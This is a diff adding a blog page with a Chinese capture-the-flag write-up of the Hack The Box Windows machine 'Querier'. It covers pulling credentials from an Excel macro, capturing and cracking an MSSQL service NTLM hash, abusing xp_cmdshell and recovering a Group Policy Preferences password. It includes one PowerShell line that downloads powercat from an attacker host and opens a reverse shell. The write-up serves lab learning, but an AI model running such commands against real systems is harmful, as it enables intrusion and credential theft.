@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="excel macros,smb share,MS-Sql,ntlmhash,Group Policy Preferences,privilege_escalation,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介：querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:public share -&amp;gt; xlsm file -&amp;gt; mssql user -&amp;gt; mssql sa -&amp;gt; group policy preferences 靶机状态: 已完成。">
+<meta name="keywords" content="excel macros,smb share,MS-Sql,ntlmhash,Group Policy Preferences,privilege_escalation">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-windows-querier">
+<meta property="og:url" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介：querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:public share -&amp;gt; xlsm file -&amp;gt; mssql user -&amp;gt; mssql sa -&amp;gt; group policy preferences 靶机状态: 已完成。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_nmap.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB-windows-querier-smb_guest.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB-windows-querier-smbserver-ntlmhash.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_hashcat.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_user_smbmap.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_usertxt.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_administrator.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_roottxt.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_reverse_shell.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:07.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB-windows-querier">
+<meta name="twitter:description" content="简介：querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:public share -&amp;gt; xlsm file -&amp;gt; mssql user -&amp;gt; mssql sa -&amp;gt; group policy preferences 靶机状态: 已完成。">
+<meta name="twitter:image" content="https://exexute.github.io/2019/04/19/HTB-windows-querier/HTB_windows_querier_nmap.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/04/19/HTB-windows-querier/">
+
+
+
+
+
+  <title>HTB-windows-querier | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/04/19/HTB-windows-querier/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB-windows-querier</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-19T00:26:20+08:00">
+                2019-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介：<br>querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:<br>public share -&gt; xlsm file -&gt; mssql user -&gt; mssql sa -&gt; group policy preferences</p>
+<p>靶机状态: 已完成。<br><a id="more"></a></p>
+<blockquote>
+<p>MSRPC、NetBIOS、SMB、MSSQL、WinRM</p>
+</blockquote>
+<p>拿到靶机先扫描一波tcp端口<code>./mnmap.sh 10.10.10.125 1000</code>, 扫完之后很懵逼, 没怎么打过windows靶机一时不知道怎么收集信息怎么深入到下一步了.<br><img src="HTB_windows_querier_nmap.png" alt="HTB_windows_querier_nmap"></p>
+<p>139端口为NetBIOS服务、445端口属于SMB服务、1433端口mssql服务、5985和47001端口为WinRM服务、135和49664-49671端口为MSRPC服务, 从1433端口的详细信息中找到<strong>主机名QUERIER</strong>、<strong>域HTB</strong>、<strong>DNS域HTB.LOCAL</strong>,  操作系统最有可能是xp、win7、Server2012。</p>
+<blockquote>
+<p>xlsm find account</p>
+</blockquote>
+<p>windows系统中默认存在一个<strong>guest</strong>账号, 使用smb工具连接smb服务的时候指定用户名为guest即可找到一个reports的共享目录, 目录中有一个xlsm文件.<br><img src="HTB-windows-querier-smb_guest.png" alt="HTB-windows-querier-smb_guest"></p>
+<p>xlsm文件为带宏的excel文件, 将xlsm文件复制为zip或rar文件然后解压, 可以在其中的xl目录下找到一个<strong>.bin</strong>的宏文件. </p>
+<p>通过<strong>olevba</strong>对bin格式的vpa宏文件进行反编译, 查看宏代码及其中硬编码的mssql账号和密码:<code>reporting / PcwTWTHRwryjc$c6</code></p>
+<blockquote>
+<p>mssql stellar ntlm hash</p>
+</blockquote>
+<p>用<strong>mssql_client</strong>登陆sqlserver数据库, 发现这是一个低权限账号, 从数据库中搜索之后没有任何发现, 尝试之后通过<strong>xp_dirtree</strong>存储过程获取到运行mssql服务的用户的ntlm hash值, 用hashcat和rockyou.txt对ntlm hash进行爆破, 找到高权限账号密码<code>mssql-svc / corporate568</code><br><img src="HTB-windows-querier-smbserver-ntlmhash.png" alt="HTB-windows-querier-smbserver-ntlmhash"><br><img src="HTB_windows_querier_hashcat.png" alt="HTB_windows_querier_hashcat"></p>
+<blockquote>
+<p>mssql find user.txt and root.txt</p>
+</blockquote>
+<p>用mssql-svc账号登陆mssql后, 开启xp_cmdshell, 用xp_cmdshell读取mssql-svc账号桌面下的user.txt<br><img src="HTB_windows_querier_user_smbmap.png" alt="HTB_windows_querier_user_smbmap"></p>
+<p>由于对mssql的不熟悉, 执行xp_cmdshell的时候发现无法直接用<code>type &lt;full path&gt;</code>读取文件, 因此通过连接符来读取<br><img src="HTB_windows_querier_usertxt.png" alt="HTB_windows_querier_usertxt"></p>
+<p>然后经过windows提权的各种ps脚本一通乱跑, 从<strong>组策略首选项</strong>的历史文件<strong>groups.xml</strong>中找到administrator的账号和加密后的密码。拿到账号密码之后尝试用ps运行子进程来读取root.txt但都以失败而告终, 不知道卡在来什么地方。<br>通过smbmap查看账号对共享目录的操作权限, 用smbclient登陆administrator账号, 下载root.txt并读取<br><img src="HTB_windows_querier_administrator.png" alt="HTB_windows_querier_administrator"></p>
+<p>root.txt<br><img src="HTB_windows_querier_roottxt.png" alt="HTB_windows_querier_roottxt"></p>
+<p>由于论坛上由大佬提出无法获取reverse shell, 于是尝试来一下, 用<code>xp_cmdshell powershell -noprofile IEX(New-Object System.Net.Webclient).DownloadString(\&quot;http://10.10.15.77/powercat.ps1\&quot;);powercat -c 10.10.15.77 -p 2145 -e powershell</code>即可获取powershell反弹shell<br><img src="HTB_windows_querier_reverse_shell.png" alt="HTB_windows_querier_reverse_shell"></p>
+<h2 id="工具-amp-amp-Keys"><a href="#工具-amp-amp-Keys" class="headerlink" title="工具 &amp;&amp; Keys"></a>工具 &amp;&amp; Keys</h2><p>完成本靶机使用的工具:<br><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener">smbmap</a><br>smbclient<br><a href="https://github.com/decalage2/oletools/blob/master/oletools/olevba.py" target="_blank" rel="noopener">olevba</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">mssqlclient</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">msbserver</a><br><a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">hashcat</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">powerup</a><br><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">powercat</a></p>
+<p>在用工具完成靶机的过程中, 遇到了很多问题:<br>1.smbmap和smbclient已知无法连接, 经排查是网络问题, 重启vpn、多运行几次工具即可<br>2.拿到账号后无法用mssqlclient登陆数据库, 经过尝试发现遇到的问题是reporting密码中含有的<code>$</code>为shell关键字, 用于获取变量, 可通过转义字符<code>\</code>进行转义或在弹出输入密码的提示框后输入; mssql的认证方式有用户认证和windows账号认证两种, 由于reporting账号是windows账号, 因此需要增加参数<strong>-windows-auth</strong>进行登陆或指定主机名<strong>querier/reporting</strong>进行登陆, 后者在mssql客户端工具上经过尝试可行, 未在mssqlclient上进行尝试<br>3.hashcat破解ntlm hash之后的密码写入原ntlm hash文件的末尾</p>
+<p>关于更多windows下渗透的工具, 请参考<strong>Pentesting test in windows</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/excel-macros/" rel="tag"># excel macros</a>
+          
+            <a href="/tags/smb-share/" rel="tag"># smb share</a>
+          
+            <a href="/tags/MS-Sql/" rel="tag"># MS-Sql</a>
+          
+            <a href="/tags/ntlmhash/" rel="tag"># ntlmhash</a>
+          
+            <a href="/tags/Group-Policy-Preferences/" rel="tag"># Group Policy Preferences</a>
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/19/HTB-linux-chaos/" rel="next" title="HTB-linux-chaos">
+                <i class="fa fa-chevron-left"></i> HTB-linux-chaos
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/21/HTB-windows-Netmon/" rel="prev" title="HTB_windows_Netmon">
+                HTB_windows_Netmon <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#工具-amp-amp-Keys"><span class="nav-number">1.</span> <span class="nav-text">工具 &amp;&amp; Keys</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
